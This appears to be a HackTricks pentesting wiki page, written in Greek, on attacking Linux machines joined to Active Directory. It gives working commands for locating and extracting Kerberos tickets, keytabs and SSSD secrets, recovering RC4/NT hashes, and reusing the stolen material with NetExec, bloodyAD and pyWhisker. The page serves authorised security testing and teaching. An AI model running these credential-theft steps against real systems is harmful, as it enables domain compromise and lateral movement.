# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ένα μηχάνημα Linux μπορεί επίσης να βρίσκεται σε περιβάλλον Active Directory.

Ένα μηχάνημα Linux σε AD μπορεί **να αποθηκεύει τοπικά υλικό Kerberos**: user ccaches, machine/service keytabs και secrets που διαχειρίζεται το SSSD. Αυτά τα τεχνουργήματα μπορούν συνήθως να επαναχρησιμοποιηθούν όπως οποιοδήποτε άλλο Kerberos credential. Για να διαβάσετε τα περισσότερα από αυτά, θα πρέπει να είστε ο χρήστης στον οποίο ανήκει το ticket ή να έχετε δικαιώματα **root** στο μηχάνημα.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Απαρίθμηση

### Απαρίθμηση AD από linux

Αν έχετε πρόσβαση σε ένα AD από linux (ή bash στα Windows), μπορείτε να δοκιμάσετε το [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να κάνετε απαρίθμηση του AD.

Μπορείτε επίσης να δείτε την ακόλουθη σελίδα για να μάθετε **άλλους τρόπους απαρίθμησης AD από linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

Το FreeIPA είναι μια open-source **εναλλακτική** του Microsoft Windows **Active Directory**, κυρίως για περιβάλλοντα **Unix**. Συνδυάζει έναν πλήρη **LDAP directory** με ένα MIT **Kerberos** Key Distribution Center, για διαχείριση παρόμοια με αυτή του Active Directory. Χρησιμοποιεί το Dogtag **Certificate System** για τη διαχείριση πιστοποιητικών CA & RA και υποστηρίζει **multi-factor** authentication, συμπεριλαμβανομένων των smartcards. Το SSSD είναι ενσωματωμένο για τις διαδικασίες authentication στο Unix.<sup>[[14]](#references)[[15]](#references)</sup> Μάθετε περισσότερα σχετικά:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Τεχνουργήματα σε host συνδεδεμένο σε domain

Πριν ασχοληθείτε με tickets, προσδιορίστε **πώς έγινε η σύνδεση του host στο AD** και **πού αποθηκεύεται πραγματικά το υλικό Kerberos**. Σε σύγχρονους Linux hosts, συνήθως γίνεται μέσω των `realmd` + `adcli` + `sssd` και όχι μόνο μέσω απλών αρχείων στο `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Αυτό σάς δείχνει γρήγορα αν ο host εμπιστεύεται το AD, αν το SSSD αποθηκεύει προσωρινά identities ή tickets και αν υπάρχουν διαθέσιμα **machine/service keytabs** ή **KCM secrets** για κατάχρηση.<sup>[[4]](#references)[[10]](#references)</sup>

Αντιμετωπίστε τα `/var/lib/sss/db/cache_*.ldb` ξεχωριστά από τα Kerberos ccaches και το `/var/lib/sss/secrets/secrets.ldb`. Τα αρχεία `cache_*.ldb` μπορεί να περιέχουν offline password verifiers, όταν ένα domain έχει `cache_credentials = true` **και** ο χρήστης έχει προηγουμένως πραγματοποιήσει authentication σε αυτόν τον host. Συνήθως είναι αναγνώσιμα μόνο με privileged access. Ένα αρχείο cache ή μια ενεργοποιημένη ρύθμιση από μόνη της δεν αποδεικνύει ότι υπάρχει διαθέσιμος, τρέχων κωδικός· εξετάστε την ενεργή ρύθμιση ανά domain και τις πραγματικά αποθηκευμένες identities προτού καταλήξετε σε αυτό το συμπέρασμα. Δείτε την [τεκμηρίωση της Red Hat για το SSSD credential cache](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Για ένα ξεχωριστό όριο identity μεταξύ Linux και AD, η [αντιστοίχιση ονομάτων Kerberos σε περιβάλλοντα μεικτών προμηθευτών](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) έχει σημασία μόνο όταν μια υπηρεσία αποδέχεται το ticket και αντιστοιχίζει το principal του σε σχετικό Unix account.

Σε host με `ksu`, ένα έγκυρο Kerberos principal μπορεί να αποκτήσει πρόσβαση σε **τοπικό target account**, συμπεριλαμβανομένου του root, μόνο όταν αυτός ο λογαριασμός εξουσιοδοτεί το principal. Η [τεκμηρίωση του MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) περιγράφει τα αρχεία `.k5login` και `.k5users` του home directory του target, καθώς και το fallback αντιστοίχισης ονομάτων όταν απουσιάζουν και τα δύο. Το `.k5users` μπορεί επίσης να περιορίζει τις εντολές για το `ksu -e`· το όνομα ενός αρχείου από μόνο του δεν αποδεικνύει πρόσβαση σε shell. Εξετάστε τον ακριβή target account, την ιδιοκτησία/τα permissions των αρχείων και τις αναγνώσιμες εγγραφές εξουσιοδότησης, τα διαθέσιμα Kerberos credentials και τους ενεργούς κανόνες αντιστοίχισης. Αν το home του root δεν είναι προσβάσιμο, η κατάσταση εξουσιοδότησης παραμένει άγνωστη. Η παθητική απαρίθμηση πρέπει να καταγράφει αυτές τις διαδρομές και τα permissions, χωρίς να ζητά tickets ή να εκτελεί `ksu`.

Ένα προγραμματισμένο backup μπορεί να δημιουργήσει έμμεσα ένα όριο εξουσιοδότησης `.k5login`. Αν ένας λογαριασμός με περισσότερα privileges αντιγράφει αναδρομικά στον δικό του home directory έναν κατάλογο στον οποίο μπορεί να γράψει ένας χρήστης με λιγότερα privileges, επαληθεύστε ότι η αντιγραφή περιλαμβάνει τα κρυφά αρχεία, ότι η διαδρομή προορισμού είναι το ενεργό home του λογαριασμού και ότι η ιδιοκτησία του αρχείου που προκύπτει γίνεται αποδεκτή από την υπηρεσία Kerberos login. Για παράδειγμα, η [τεκμηρίωση του rsync](https://download.samba.org/pub/rsync/rsync.1.html) αναφέρει ότι το `-a --no-owner` αφήνει τα νέα αρχεία προορισμού στην ιδιοκτησία του χρήστη που τα λαμβάνει. Η [τεκμηρίωση του MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) εξηγεί πώς ένα principal στο `.k5login` αυτού του χρήστη μπορεί να εξουσιοδοτήσει την πρόσβαση. Επιβεβαιώστε την ταυτότητα RunAs της προγραμματισμένης εργασίας, την πρόσβαση εγγραφής στην πηγή, τις ενεργές επιλογές rsync, τη σύνδεση με ενεργοποιημένο GSSAPI και ένα έγκυρο ticket για το αναφερόμενο principal· ένας εγγράψιμος κατάλογος πηγής ή μια προγραμματισμένη εντολή rsync από μόνα τους δεν αποδεικνύουν ότι είναι δυνατή αυτή η διαδρομή.

Ένα αναγνώσιμο keytab χρειάζεται επίσης έλεγχο ανά principal. Ένα keytab που περιέχει principal με όνομα διαχειριστή δεν αποδεικνύει από μόνο του δικαιώματα διαχείρισης: η [πολιτική `kadm5.acl` του KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) καθορίζει τις επιτρεπόμενες ενέργειες για principals. Επιβεβαιώστε ξεχωριστά το principal, το ενεργό ACL και την εξουσιοδότηση μέσω τοπικού `ksu` ή login, προτού θεωρήσετε την πρόσβαση στο keytab τρόπο απόκτησης πρόσβασης root. Η παθητική διαλογή μπορεί να καταγράψει τη διαδρομή και τα permissions του keytab, χωρίς να χρησιμοποιήσει τα κλειδιά του ή να επικοινωνήσει με το KDC.

## Ενασχόληση με tickets

### Pass The Ticket

Σε αυτήν τη σελίδα θα βρείτε διάφορες τοποθεσίες όπου μπορείτε να **εντοπίσετε Kerberos tickets σε έναν Linux host**. Στην παρακάτω σελίδα μπορείτε να μάθετε πώς να μετατρέψετε αυτά τα ticket σε μορφή CCache σε Kirbi (τη μορφή που χρειάζεστε στα Windows), καθώς και πώς να εκτελέσετε μια επίθεση PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Αν θέλετε τις **ροές εργασίας συλλογής tickets ειδικά για Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` κ.λπ.), δείτε την ειδική σελίδα:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Επαναχρησιμοποίηση CCACHE ticket από το /tmp

Τα αρχεία CCACHE είναι δυαδικές μορφές για **την αποθήκευση Kerberos credentials**. Το `FILE:/tmp/krb5cc_%{uid}` εξακολουθεί να είναι συνηθισμένο, αλλά οι σύγχρονες εγκαταστάσεις Linux χρησιμοποιούν επίσης `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ή `KCM:%{uid}`. Ελέγξτε τη μεταβλητή περιβάλλοντος **`KRB5CCNAME`** και τη ρύθμιση `default_ccache_name` προτού υποθέσετε ότι τα tickets βρίσκονται στο `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Επαναχρησιμοποίηση ticket CCACHE από το keyring

**Τα Kerberos tickets που είναι αποθηκευμένα στη μνήμη μιας διεργασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace του μηχανήματος είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο εργαλείο για αυτόν τον σκοπό βρίσκεται στο [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) και διευκολύνει την εξαγωγή με έγχυση στις συνεδρίες και αποθήκευση των tickets στο `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Για τη ρύθμιση και χρήση αυτού του εργαλείου, ακολουθούνται τα παρακάτω βήματα:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Αυτή η διαδικασία θα επιχειρήσει να κάνει inject σε διάφορα sessions, υποδεικνύοντας επιτυχία αποθηκεύοντας τα tickets που εξήγαγε στο `/tmp`, σύμφωνα με τη σύμβαση ονομασίας `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Επαναχρησιμοποίηση ticket CCACHE από το SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της βάσης δεδομένων στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο key αποθηκεύεται ως κρυφό αρχείο στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το key είναι αναγνώσιμο μόνο αν έχετε δικαιώματα **root**.<sup>[[4]](#references)</sup>

Η εκτέλεση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα αναλύσει τη βάση δεδομένων και θα **αποκρυπτογραφήσει τα secrets**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Ο extractor εκτυπώνει ακατέργαστα JSON payloads Kerberos· μετατρέψτε τα σε αξιοποιήσιμη cache εισιτηρίων ή σε άλλη μορφή εισιτηρίου πριν από τις ενέργειες pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Γρήγορη αρχική αξιολόγηση keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Εξαγωγή λογαριασμών από το /etc/krb5.keytab

Τα κλειδιά λογαριασμών υπηρεσιών, απαραίτητα για υπηρεσίες που λειτουργούν με προνόμια root, αποθηκεύονται με ασφάλεια σε αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, που αντιστοιχούν σε κωδικούς πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.<sup>[[5]](#references)</sup>

Για την επιθεώρηση των περιεχομένων του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Στο Linux, η εντολή `klist -k -K -e` εμφανίζει τα principals, τους αριθμούς έκδοσης των κλειδιών, τους τύπους κρυπτογράφησης και το ακατέργαστο υλικό κλειδιού. Αν ο τύπος κλειδιού είναι **23 / RC4-HMAC**, η τιμή του κλειδιού είναι επίσης το **NT hash** του συγκεκριμένου principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Για χρήστες Linux, το **`KeyTabExtract`** παρέχει τη δυνατότητα εξαγωγής του hash RC4 HMAC, το οποίο μπορεί να αξιοποιηθεί για επαναχρησιμοποίηση hash NTLM. Σημειώστε ότι αυτό βοηθά μόνο όταν το keytab εξακολουθεί να περιέχει υλικό **etype 23 / RC4-HMAC**. Σε περιβάλλοντα **μόνο με AES** ενδέχεται να μην μπορείτε να αποκτήσετε ένα επαναχρησιμοποιήσιμο hash NT, αλλά μπορείτε και πάλι να πραγματοποιήσετε απευθείας έλεγχο ταυτότητας με το keytab μέσω Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Στο macOS, το **`bifrost`** λειτουργεί ως εργαλείο για την ανάλυση αρχείων keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Χρησιμοποιώντας τις εξαγόμενες πληροφορίες λογαριασμών και hash, μπορούν να δημιουργηθούν συνδέσεις με servers μέσω εργαλείων όπως το **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Επαναχρησιμοποίηση του machine account από το `/etc/krb5.keytab`

Σε συστήματα που έχουν συνδεθεί με `realmd`/`adcli`/`sssd`, το `/etc/krb5.keytab` συνήθως περιέχει το **computer account** και ένα ή περισσότερα **host/service principals**. Αν έχεις **root**, μην το κάνεις απλώς dump: χρησιμοποίησε ένα από τα principals που εμφανίζονται με την εντολή `klist -k` για να ζητήσεις ένα TGT και να ενεργήσεις ως ο ίδιος ο Linux host.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν το ίδιο το **computer object** έχει εκχωρημένα δικαιώματα στο AD ή όταν επιτρέπεται στον host να ανακτά άλλα secrets, όπως ένα **gMSA**.<sup>[[13]](#references)</sup>

### Επαναχρησιμοποίηση κλεμμένου υλικού Kerberos με Linux-first εργαλεία AD

Μόλις αποκτήσετε ένα έγκυρο `ccache` ή ένα αξιοποιήσιμο keytab, μπορείτε να ενεργείτε απευθείας στο AD **από Linux**, χωρίς να μετατρέψετε πρώτα τα πάντα σε μορφές Windows. Πολλά σύγχρονα εργαλεία υποστηρίζουν εγγενώς τα `KRB5CCNAME` / Kerberos auth.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Αυτό αποτελεί μια καλή γέφυρα ανάμεσα στο **Linux post-exploitation** και την κατάχρηση αντικειμένων AD. Για τις ίδιες τις διαδρομές κατάχρησης σε επίπεδο αντικειμένων, δείτε:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Τεχνουργήματα Linux gMSA / Managed Service Account

Οι πρόσφατες εγκαταστάσεις Linux μπορούν να χρησιμοποιούν απευθείας από το AD **Managed Service Accounts**. Στην πράξη, αυτό σημαίνει ότι, αφού παραβιάσετε έναν Linux server, μπορεί να βρείτε όχι μόνο το keytab του host, αλλά και **keytabs ειδικά για υπηρεσίες**, τα οποία δημιουργήθηκαν από ένα gMSA. Συνηθισμένα σημεία για έλεγχο είναι το `/etc/gmsad.conf`, αρχεία ρυθμίσεων ειδικά για την εγκατάσταση και πρόσθετα αρχεία `*.keytab` κάτω από το `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Αυτό σας παρέχει μια επαναχρησιμοποιήσιμη ταυτότητα Kerberos για τα SPN που είναι συνδεδεμένα με αυτό το gMSA **χωρίς να αγγίξετε κανένα endpoint Windows**.<sup>[[13]](#references)</sup> Για κατάχρηση gMSA/dMSA **από την πλευρά του domain**, αφού αποκτήσετε υψηλότερα προνόμια στο AD, δείτε:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos;](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Πρόσβαση στο AD με managed service account – Άμεση ενσωμάτωση συστημάτων RHEL με το Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Μεταβλητές περιβάλλοντος Kerberos – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Τύποι κρυπτογράφησης RC4-HMAC Kerberos που χρησιμοποιούνται από το Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Χρήση του Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Εντοπισμός και σύνδεση σε domains ταυτοτήτων | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Οδηγός χρήσης του bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Σχετικά | Τεκμηρίωση FreeIPA](https://www.freeipa.org/About.html)
- [15] [Σημειώσεις έκδοσης FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Τεκμηρίωση πυρήνα Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
